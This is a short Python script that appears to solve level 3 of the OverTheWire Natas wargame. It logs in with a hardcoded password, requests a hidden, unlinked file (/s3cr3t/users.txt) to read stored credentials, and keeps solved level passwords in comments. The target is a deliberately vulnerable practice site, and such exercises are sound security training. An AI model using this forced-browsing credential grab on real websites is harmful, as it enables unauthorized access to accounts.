#!/usr/bin/python3

import requests
import re

user = 'natas3'
password = 'G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q'
url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' %user
# directory = '' 


resp = requests.get(url,auth=(user,password))
content = resp.text

print(content)

# print(re.findall('password (.*)', content))

# g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
# h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
# G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
# natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm